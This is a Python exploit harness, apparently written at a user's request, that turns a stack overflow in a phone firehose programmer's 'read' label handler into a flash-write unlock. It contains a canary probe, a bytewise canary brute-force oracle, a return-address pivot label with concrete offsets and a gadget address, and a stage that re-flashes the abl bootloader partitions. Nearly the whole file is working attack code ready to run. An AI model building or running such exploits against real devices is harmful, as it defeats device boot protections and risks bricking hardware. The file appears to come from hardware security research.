#!/usr/bin/env python3
"""flag1_chain.py — chain research harness for the `read` label stack overflow.

Goal (user request): turn the `<read label>` OOB write into a write-permission unlock
(flag1 @ 0x8046bbc0) so the abl_a / abl_b partitions can be re-flashed, in the style of
CVE-2026-112611 (OOB write -> controlled memory-corruption primitive).

What static analysis of prog_firehose_ddr.elf (sha256 31ad5664...) establishes:

  COPY PRIMITIVE (0x149a438c):
    vsnprintf(dst=x29-0x50, size=strlen(label)+1, "%s", label)
    - size comes from strlen() of the HOST label (dead bound check at 0x149a4368)
    - the copy is continuous and CANNOT pass an embedded NUL in the label value;
      exactly one extra NUL is written by the formatter, at dst[strlen(label)].

  STACK GEOMETRY (read handler 0x149a41a4, frame 0x160):
    dst+0x48  canary      (compared against .data 0x149de358 at 0x149a42bc)
    dst+0x50  saved x29
    dst+0x58  saved x30   <- the only control-flow slot
    dst+0x60..0x98  saved x28,x24,x23,x22,x21,x20,x19 (note the +0x68 hole)

  THE ONE-SLOT THEOREM (this file proves it, see docs/CHAIN_NOTES.md):
    1. Every byte of the label must be NUL-free (XML attribute + strlen semantics).
    2. Therefore only ONE 64-bit slot can hold a crafted code pointer: the LAST FOUR
       label bytes (the low 4 bytes of the pointer) followed by the formatter's own
       NUL and the three original zero high bytes of the saved return address.
    3. That one slot is saved x30. Everything past it keeps original stack content.
    4. If the canary is the shipped constant 0x00000000C0C0C0C0, bytes 4..7 of the
       canary are NULs sitting mid-label: a label that matches them must END inside
       the canary and never reaches x30. If the canary is TZ-seeded entropy, it may
       be all-nonzero - but it is unknown, so it must be recovered first.

  CANARY ORACLE:
    A label that stops at dst+0x48+i and writes guess G at byte i leaves canary bytes
    0..i-1 intact: the cookie check passes iff bytes 0..i match. Survive -> byte i == G.
    Each wrong guess hangs the programmer (spin loop 0x149a006c) and needs a physical
    power cycle + Sahara re-upload. Byte i costs at most 256 cycles (expected 128).

  ONE-SHOT PIVOT (only after a NUL-free canary is recovered):
    label = 'A'*0x48 + canary(8) + 'J'*8 + low4(0x149a2c10)   # total len 0x5C
    0x149a2c10: mov w0,#1 ; bl 0x149aabd0   <- the bl sets x30, flag1 := 1
    The tail then runs with ORIGINAL stack (all our slots past the terminator are
    untouched): memcpy(0x8045d67c,[SP_L],0x100), log, 0x149aa924(SP_L,1) channel close,
    ldp x29,x30,[SP_L+0x10] -> 0x14999cb0 (the loop function's true saved LR, which
    the original stack still holds), then ldp x29,x30,[SP_L+0x40/0x48] reads the loop
    frame's saved x22/x21 - DATA pointers, not code - so the final ret faults.
    => flag1 := 1, then the session dies within microseconds. There is no known
    construction that returns to the dispatcher loop (0x149a1fc0) from a single-slot
    overflow; the slots it would need ([SP_L+0x20], [SP_L+0x48]) all lie beyond the
    label terminator and are unpaintable (see CHAIN_NOTES.md for the full walk).
    flag1 dies with the session, so a dead session means no <program>.

USAGE:
  --stage probe      discriminating canary probe: label 'A'*0x48 + c0c0c0c0. The
                     formatter's NUL lands on cookie byte 4. Answers => the cookie is
                     the shipped constant (no TZ seed; on that unit the label must stop
                     inside the canary -> x30 unreachable, chain impossible, stop).
                     Silent => cookie is live entropy -> recover with --stage oracle.
  --stage oracle     bytewise canary recovery (needs a live-entropy unit and a hand
                     ready to power-cycle between guesses). Saves to canary.bin.
  --stage pivot      one-shot: requires canary.bin, sends the 0x5C label, then probes
                     <getbasicdata> (flag1-gated) and, if the session is somehow still
                     answering, chains straight into the abl flash flow.
  --stage flash      assumes flag1 already set in this session (e.g. right after a
                     pivot that kept the loop alive): transfercfg safety net, test
                     program 1 sector to abl_b, flash abl_a+abl_b, verify by readback.
  --dry-run          print the labels/XML, touch nothing.

This script never sends anything destructive without the explicit stages above.
Do not run --stage oracle / pivot on a device you cannot physically power-cycle.
"""
from __future__ import annotations

import argparse
import os
import sys
import time

import fhcore
from fhcore import log, log_raw

# ---------------------------------------------------------------- geometry
DST = 0                       # label byte 0 == dst
OFF_CANARY = 0x48
OFF_SAVED_X29 = 0x50
OFF_SAVED_X30 = 0x58
OFF_FRAME_END = 0xA0

# ---------------------------------------------------------------- targets
SET_FLAG1_BL_SITE = 0x149a2c10   # mov w0,#1 ; bl 0x149aabd0 (bl sets x30 = 0x149a2c18)
FLAG1_ADDR = 0x8046BBC0
RX_BUF = 0x8045D900              # loop-fn rx buffer (constant, 0x149a68e8)

DEFAULT_IMAGES = os.environ.get("EDL_IMAGE_DIR", "./IMAGES/")
DEFAULT_ELF = os.path.join(DEFAULT_IMAGES, "prog_firehose_ddr.elf")
DEFAULT_ABL = os.environ.get("ABL_IMG", os.path.join(DEFAULT_IMAGES, "abl.elf"))
CANARY_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "canary.bin")

SECTOR = 4096
ABL_A = dict(lun=4, start=98310, nsec=256)
ABL_B = dict(lun=4, start=458038, nsec=256)


# ---------------------------------------------------------------- label helpers
def label_bytes(payload: bytes) -> bytes:
    """The raw label attribute value. Must be NUL-free and quote-free."""
    if b"\x00" in payload:
        raise ValueError("label contains a NUL — the copy would stop there")
    if b'"' in payload or b"&" in payload or b"<" in payload or b">" in payload:
        raise ValueError("label contains XML-significant bytes")
    return payload


def build_read_xml(label: bytes) -> bytes:
    head = (
        '<?xml version="1.0" ?><data><read SECTOR_SIZE_IN_BYTES="512" '
        'num_partition_sectors="1" physical_partition_number="0" '
        'start_sector="0" label="'
    ).encode()
    return head + label + b'" /></data>'


def canary_probe_label() -> bytes:
    """Discriminating probe (0x4C bytes): reproduce the constant's low half.

    'A'*0x48 + c0c0c0c0 writes the cookie slot as c0 c0 c0 c0 with the formatter's
    NUL on byte 4. Against the shipped seed 0x00000000C0C0C0C0 all 8 bytes compare
    equal (bytes 5..7 keep their original zeros) — the session answers. Any other
    seed mismatches and the epilogue spins (silent session).
    (A plain 0x50 'A' clobber mismatches EVERY seed and proves nothing.)
    """
    return label_bytes(b"A" * OFF_CANARY + b"\xc0\xc0\xc0\xc0")


def oracle_label(prefix: bytes, guess: int) -> bytes:
    """Known canary prefix + one guessed byte; copy ends right after the guess."""
    if guess == 0:
        raise ValueError("guess 0 would terminate the label — cannot probe NULs")
    return label_bytes(prefix + bytes([guess]))


def pivot_label(canary: bytes) -> bytes:
    """One-shot pivot label.

    Layout (dst-relative):
      0x00..0x47  'A' filler (in-bounds)
      0x48..0x4F  the 8 canary bytes (must be NUL-free — see CHAIN_NOTES)
      0x50..0x57  'J' junk -> saved x29 (dead register at ret time)
      0x58..0x5B  low 4 bytes of 0x149a2c10 (little endian)
      0x5C        formatter's NUL terminator (writes the 5th byte of saved x30)
      0x5D..0x5F  untouched original bytes of saved x30 = 00 00 00
    => saved x30 == 0x00000000_149a2c10 with zero NULs inside the label.
    """
    if len(canary) != 8:
        raise ValueError("canary must be 8 bytes")
    if 0 in canary:
        raise ValueError(
            "canary contains a NUL byte — the label cannot carry it; "
            "the pivot is impossible on this unit (see CHAIN_NOTES.md)"
        )
    low4 = SET_FLAG1_BL_SITE.to_bytes(8, "little")[:4]
    return label_bytes(b"A" * OFF_CANARY + canary + b"J" * 8 + low4)


# ---------------------------------------------------------------- session extras
def nop_alive(session, timeout: float = 2.0):
    resp = session.send('<?xml version="1.0" ?><data><nop /></data>', timeout)
    if b"ACK" in resp or b"NAK" in resp:
        return True, resp
    return False, resp


def probe_flag1(session) -> bool | None:
    """getbasicdata is flag1-gated: ACK => flag1 != 0."""
    resp = session.send('<?xml version="1.0" ?><data><getbasicdata /></data>', 1.5)
    if b"ACK" in resp:
        return True
    if b"NAK" in resp or b"not allowed" in resp:
        return False
    return None


def read_sectors(session, lun, start, nsec, timeout=30):
    xml = (
        '<?xml version="1.0" ?><data><read SECTOR_SIZE_IN_BYTES="%d" label="probe" '
        'num_partition_sectors="%d" physical_partition_number="%d" '
        'start_sector="%d" /></data>'
    ) % (SECTOR, nsec, lun, start)
    session.port.write(xml.encode())
    buf = b""
    data = b""
    rawmode = False
    t0 = time.time()
    while time.time() - t0 < timeout:
        d = session.port.read(0x400000)
        if not d:
            time.sleep(0.01)
            continue
        if not rawmode:
            buf += d
            if b'rawmode="true"' in buf:
                rawmode = True
                idx = buf.find(b"</data>")
                if idx != -1:
                    data = buf[idx + 7:]
                    buf = buf[: idx + 7]
            elif b"NAK" in buf:
                return None, buf
        else:
            data += d
            if len(data) >= nsec * SECTOR:
                return data[: nsec * SECTOR], buf
    return (data or None), buf


def program_sectors(session, lun, start, nsec, payload, label, timeout=600):
    assert len(payload) == nsec * SECTOR
    xml = (
        '<?xml version="1.0" ?><data><program SECTOR_SIZE_IN_BYTES="%d" label="%s" '
        'num_partition_sectors="%d" physical_partition_number="%d" '
        'start_sector="%d" /></data>'
    ) % (SECTOR, label, nsec, lun, start)
    session.port.write(xml.encode())
    time.sleep(0.5)
    r = session.drain(1.0)
    if b'rawmode="true"' not in r and b"NAK" in r:
        return None, r
    pos = 0
    while pos < len(payload):
        session.port.write(payload[pos:pos + 512 * 1024])
        pos += 512 * 1024
        time.sleep(0.02)
    resp = b""
    t0 = time.time()
    while time.time() - t0 < timeout:
        d = session.port.read(0x100000)
        if d:
            resp += d
            if b"<response" in resp and (b"ACK" in resp or b"NAK" in resp):
                break
        else:
            time.sleep(0.05)
    return (b"ACK" in resp and b"NAK" not in resp), resp


def set_transfercfg(session, reboot_type: str, timeout_sec: int = 10):
    xml = (
        '<?xml version="1.0" ?><data><transfercfg reboot_type="%s" '
        'timeout_in_sec="%d" /></data>'
    ) % (reboot_type, timeout_sec)
    resp = session.send(xml, 1.0)
    return (b"ACK" in resp and b"NAK" not in resp), resp


# ---------------------------------------------------------------- stages
def stage_probe(session) -> bool | None:
    log("stage probe: 'A'*0x48 + c0c0c0c0 (reproduces the shipped cookie low half;")
    log("             the formatter NUL lands on cookie byte 4)")
    xml = build_read_xml(canary_probe_label())
    log_raw("RX", session.send(xml, 2.0))
    time.sleep(0.3)
    alive, resp = nop_alive(session)
    if alive:
        log("*** session answered: the cookie is the shipped constant 0x00000000C0C0C0C0")
        log("    (TZ seed service did not run on this unit). The only labels that pass")
        log("    the cookie check must stop inside the canary (bytes 4..7 of the slot are")
        log("    NULs mid-label) — saved x30 is unreachable.")
        log("    => controlled return is IMPOSSIBLE on this unit. Stop here; OSIG replay")
        log("       is the only write-unlock path for this hardware.")
        return True
    log("*** session went silent — the cookie is NOT the shipped constant (live entropy)")
    log("    it may be all-nonzero (P ~= 96.9%%); recover it with --stage oracle.")
    log("    power-cycle the phone, then re-run.")
    return None


def stage_oracle(session, known: bytearray, interactive: bool = True) -> bytes:
    """Recover the canary byte by byte. WRONG GUESS == HUNG SESSION: this loop
    requires the operator to power-cycle + replug between failed guesses; when a
    probe hangs we abort and print resume instructions (the loop re-runs with the
    prefix already on disk)."""
    if len(known) > 8:
        raise ValueError("canary already recovered")
    while len(known) < 8:
        i = len(known)
        found = False
        for guess in range(1, 256):          # 0x00 cannot be probed (label terminator)
            xml = build_read_xml(oracle_label(bytes(known), guess))
            log("probe byte %d guess 0x%02x" % (i, guess))
            session.send(xml, 1.2)
            time.sleep(0.2)
            alive, _ = nop_alive(session)
            if alive:
                log("  byte %d == 0x%02x (session alive)" % (i, guess))
                known.append(guess)
                with open(CANARY_FILE, "wb") as fh:
                    fh.write(bytes(known))
                found = True
                break
            log("  miss -> HUNG. power-cycle the phone, then re-run --stage oracle")
            if interactive:
                return bytes(known)         # resume after power cycle
        if not found:
            log("all 255 nonzero guesses missed byte %d -> byte is 0x00 -> "
                "NUL inside the canary -> pivot impossible on this unit" % i)
            return bytes(known)
    log("canary recovered: %s" % bytes(known).hex())
    return bytes(known)


def stage_pivot(session) -> int:
    if not os.path.exists(CANARY_FILE):
        log("no canary.bin — run --stage oracle first")
        return 1
    canary = open(CANARY_FILE, "rb").read()
    if len(canary) != 8:
        log("canary.bin is %d bytes, need 8 — re-run --stage oracle" % len(canary))
        return 1
    if 0 in canary:
        log("canary contains a NUL byte — the one-slot construction cannot carry it.")
        log("flag1 pivot impossible on this unit (proof in docs/CHAIN_NOTES.md).")
        return 2
    label = pivot_label(canary)
    log("stage pivot: label len 0x%x, x30 -> %#x" % (len(label), SET_FLAG1_BL_SITE))
    log_raw("TX", build_read_xml(label))
    session.send(label and build_read_xml(label), 1.5)
    time.sleep(0.5)
    alive, resp = nop_alive(session, 2.5)
    if not alive:
        log("session dead after pivot (expected: the tail's final ret faults).")
        log("flag1 WAS set (bl set_flag1 executed before the tail) but it dies with")
        log("the session — a fresh Sahara upload starts a new programmer with flag1=0.")
        log("=> no same-session <program> from this bug. See CHAIN_NOTES.md.")
        return 3
    log("session STILL ALIVE after pivot — unusual (tail survived). checking flag1:")
    f1 = probe_flag1(session)
    log("getbasicdata -> %s" % ("ACK: flag1=1 — WRITE UNLOCKED" if f1 else str(f1)))
    if f1:
        log("proceeding to the abl flash flow")
        return stage_flash(session)
    return 4


def stage_flash(session) -> int:
    abl_path = os.environ.get("ABL_IMG", DEFAULT_ABL)
    if not os.path.exists(abl_path):
        log("abl image not found: %s" % abl_path)
        return 1
    abl = open(abl_path, "rb").read()
    nsec = (len(abl) + SECTOR - 1) // SECTOR
    pad = abl + b"\xFF" * (nsec * SECTOR - len(abl))

    log("flag1 check (getbasicdata)")
    if probe_flag1(session) is not True:
        log("flag1 == 0 — flash stage refuses to run")
        return 2

    log("safety net: transfercfg reset_to_edl (10 s)")
    ok, resp = set_transfercfg(session, "reset_to_edl", 10)
    log("  -> %s %s" % (ok, resp[-120:]))

    log("PROGRAM TEST: 1 sector 0xFF -> abl_b (LUN4 s458038)")
    ok, resp = program_sectors(session, ABL_B["lun"], ABL_B["start"], 1,
                               b"\xFF" * SECTOR, "abl_b", timeout=120)
    log("  -> %s %s" % (ok, (resp or b"")[-160:]))
    if ok is not True:
        log("program still gated — abort")
        return 3

    log("read back test sector")
    d, _ = read_sectors(session, ABL_B["lun"], ABL_B["start"], 1)
    if d:
        log("  readback %s -> %s" % (d[:8].hex(),
                                     "WRITTEN" if d[:4] == b"\xff\xff\xff\xff" else "unchanged"))

    log("flash abl_b (s458038, %d sectors)" % nsec)
    ok, resp = program_sectors(session, ABL_B["lun"], ABL_B["start"], nsec, pad,
                               "abl_b", timeout=900)
    log("  -> %s %s" % (ok, (resp or b"")[-160:]))
    if ok is not True:
        return 4

    log("flash abl_a (s98310, %d sectors)" % nsec)
    ok, resp = program_sectors(session, ABL_A["lun"], ABL_A["start"], nsec, pad,
                               "abl_a", timeout=900)
    log("  -> %s %s" % (ok, (resp or b"")[-160:]))
    if ok is not True:
        return 4

    log("verify abl_a first sector (must NOT be MZ)")
    d, _ = read_sectors(session, ABL_A["lun"], ABL_A["start"], 1)
    if d:
        log("  readback %s %s" % (d[:8].hex(), "OK" if d[:2] != b"MZ" else "STILL MZ"))

    log("clear safety net (reboot_type=none)")
    ok, resp = set_transfercfg(session, "none", 1)
    log("  -> %s %s" % (ok, resp[-100:]))

    log("power reset")
    session.send('<?xml version="1.0" ?><data><power Value="reset" /></data>', 1.0)
    log("DONE — watch the phone.")
    return 0


# ---------------------------------------------------------------- main
def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--port", default=None)
    ap.add_argument("--elf", default=DEFAULT_ELF)
    ap.add_argument("--images", default=DEFAULT_IMAGES)
    ap.add_argument("--stage", choices=("probe", "oracle", "pivot", "flash"),
                    required=True)
    ap.add_argument("--mode-type", type=int, default=5)
    ap.add_argument("--dry-run", action="store_true")
    args = ap.parse_args()

    if args.dry_run:
        print("== probe label (0x50) ==")
        print(build_read_xml(canary_probe_label()).decode("latin1"))
        print()
        print("== oracle label (prefix c0, guess 0x41) ==")
        print(build_read_xml(oracle_label(bytes([0xc0]), 0x41)).decode("latin1"))
        print()
        print("== pivot label (canary c0c0c0c0c0c0c0c0, x30 -> 0x149a2c10) ==")
        try:
            print(build_read_xml(pivot_label(bytes([0xc0] * 8))).decode("latin1"))
        except ValueError as e:
            print("(rejected: %s)" % e)
        return

    fw = fhcore.load(args.elf)
    log("binary match: %s" % fw.verify_identity())

    cfg = fhcore.LiveConfig(port=args.port, image_dir=args.images)
    session, portname = fhcore.open_live_session(cfg, send_digest=True,
                                                 mode_type=args.mode_type)
    log("session on %s" % portname)
    try:
        if args.stage == "probe":
            stage_probe(session)
        elif args.stage == "oracle":
            known = bytearray(open(CANARY_FILE, "rb").read()) \
                if os.path.exists(CANARY_FILE) else bytearray()
            log("oracle: %d/8 bytes known" % len(known))
            stage_oracle(session, known)
        elif args.stage == "pivot":
            sys.exit(stage_pivot(session))
        elif args.stage == "flash":
            sys.exit(stage_flash(session))
    finally:
        session.close()
    log("done")


if __name__ == "__main__":
    main()
